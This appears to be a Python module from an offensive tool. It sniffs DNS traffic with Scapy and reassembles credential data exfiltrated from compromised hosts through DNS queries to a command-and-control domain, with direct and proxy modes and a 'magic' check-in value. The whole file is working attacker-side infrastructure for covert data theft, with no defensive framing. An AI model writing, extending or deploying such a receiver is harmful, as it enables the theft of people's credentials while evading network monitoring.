import threading
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class DNSModule(threading.Thread):
    """
    Class to observe DNS packets
    and decrypt credentials
    """
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.iface = conf['IFACE']
        self.magic = conf['MAGIC']
        self.ccname = conf['CCNAME']
        self.max = 25
        self.cry = []

    def pkt_callback(self, pkt):
        """
        Proccess DNS packets (direct or via Proxy exfil)
        """
        if self.ccname.encode() in pkt[DNS].qd.qname:
            if pkt[DNS].qd.qtype == 2:
                method = 'DNS'
            else:
                method = 'Proxy_DNS'
            if pkt[DNS].qd.qname.decode() == str(self.magic) + '.' + self.ccname:
                self.q.put((self.magic, pkt[IP].src, method))
            elif 'l.' + self.ccname in pkt[DNS].qd.qname.decode():
                self.pktlen = int(pkt[DNS].qd.qname.decode().split('l.')[0])
                if self.pktlen % self.max != 0:
                    self.pkttotal = int(self.pktlen / self.max + 1)
                else:
                    self.pkttotal = int(self.pktlen / self.max)
                self.cry = []
            else:
                chunk = pkt[DNS].qd.qname.decode().split('.')[0]
                if chunk not in self.cry:
                    self.cry.append(chunk)
            if len(self.cry) == self.pkttotal: 
                encrypted = ''.join(self.cry)
                self.q.put((encrypted, pkt[IP].src, method))
                self.cry = []
                self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, store=0,
                  filter="udp and dst port 53")

    def join(self):
        self.stoprequest.set()
